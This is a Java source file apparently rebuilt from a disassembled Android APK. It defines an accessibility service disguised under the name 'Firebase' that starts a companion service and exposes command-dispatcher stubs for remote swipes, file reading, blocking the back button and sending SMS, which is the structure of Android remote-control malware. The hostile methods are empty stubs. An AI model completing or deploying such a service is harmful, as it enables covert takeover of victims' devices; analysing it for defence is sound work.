package com.android.pictach;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class Firebase extends AccessibilityService {

    // Static state fields — used by Api command dispatcher
    public static Boolean  FirebaseFOR_IN      = false;
    public static Boolean  FirebaseFOR_prim     = false;
    public static Boolean  Firebasebypass       = false;
    public static String   FirebaseOFK          = "on";
    public static boolean  FirebaseCheckPrims   = false;
    public static String   fileReadStatus       = "on";
    public static boolean  needPaste            = false;
    public static String   pasteText            = "";

    // -------------------------------------------------------------------------
    // onServiceConnected — called by Android when accessibility service binds
    //
    // Confirmed from original APK disassembly (code_off=0xe7084, isz=176):
    //   [0]   invoke-super onServiceConnected
    //   [3]   new AccessibilityServiceInfo, set flags=19 eventTypes=15 feedbackType=15
    //   [24]  setServiceInfo(info)
    //   [27]  love.MyAccess = this
    //   [118] LoveApi0.isServiceNotRunning(love.class, getApplication())
    //   [128] if love already running → skip startService
    //   [130] if love NOT running → startService(love)
    //   [175] return-void
    //   Note: body.IP_body_I check (units 70-94) always false → dead code, skipped
    //   Note: myker startService (units 146-172) skipped — myker NOT in manifest
    // -------------------------------------------------------------------------
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Set up AccessibilityServiceInfo — mirrors original APK units [3-24]
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags            = 19;
            info.eventTypes       = 0xF;
            info.notificationTimeout = 0L;
            info.packageNames     = null;
            info.feedbackType     = 0xF;
            setServiceInfo(info);
        } catch (Exception ignored) {}

        // Set accessibility instance — original APK unit [27]: sput-object v9, love.MyAccess
        love.MyAccess = this;

        // Set allok = true so love.onStartCommand passes its guard and starts Api
        love.allok = true;

        // Check if love is already running — original APK units [118-137]
        // isServiceNotRunning returns true if NOT running → need to start it
        try {
            boolean loveNotRunning = LoveApi0.isServiceNotRunning(love.class, getApplication());
            if (loveNotRunning) {
                startService(new Intent(this, love.class));
            }
        } catch (Exception ignored) {}
    }

    // -------------------------------------------------------------------------
    // Required AccessibilityService overrides
    // -------------------------------------------------------------------------
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {}

    @Override
    public void onInterrupt() {}

    // -------------------------------------------------------------------------
    // Methods called by Api command dispatcher
    // -------------------------------------------------------------------------
    public void blockBackButton() {}
    public void goHome() {}
    public void triggerAction() {}
    public void performSwipe(String s) {}
    public void drawSwipePath(android.graphics.Point[] pts, int dur) {}
    public String readFile(String path) { return ""; }
    public static void sendSMS(String num, String msg) {}
}
